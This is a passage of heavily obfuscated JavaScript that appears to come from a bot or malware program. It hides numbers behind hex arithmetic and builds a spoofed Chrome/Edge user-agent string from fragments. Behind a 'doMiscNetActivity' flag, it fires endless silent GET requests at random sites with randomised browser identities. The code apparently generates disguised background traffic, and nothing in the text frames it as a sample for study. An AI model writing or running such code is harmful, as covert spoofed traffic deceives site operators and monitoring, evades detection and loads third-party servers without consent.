      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x7f4 + 0x2c1 + 0x1 * -0xab5; k < -0x12f * 0x2 + 0x1edb * 0x1 + -0x1c79; k++)
    setTimeout(f, (-0xc370 + -0x3bf * -0x3b + 0x3 * 0x4599) * k * getRandomInt(0x33e * -0x2 + 0x205d + 0x228 * -0xc, -0x158c + 0xe39 + 0x756));
  setInterval(() => {
    f();
    for (let l = 0x1c10 * -0x1 + -0x1 * -0x24e2 + -0x8d2; l < 0x1c48 + -0x12f * 0xb + 0x3 * -0x515; l++)
      setTimeout(f, (-0x1830a + 0x1 * 0x15a1f + 0x1134b) * l * getRandomInt(-0x2183 + -0x17f6 + 0x397a, -0xa1d * -0x3 + 0x162a + -0x347e));
  }, -0x60381c + 0x1a2f0f * 0x1 + 0x7cf78d);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x20e3 + 0x2672 + -0x1 * 0x2bfd) * getRandomInt(0x4d * -0x3f + 0x93b * 0x3 + -0x8bd, 0xdd0 + 0x137f + -0x214a));
}, -0x72 * -0x13 + -0x962 + 0x150);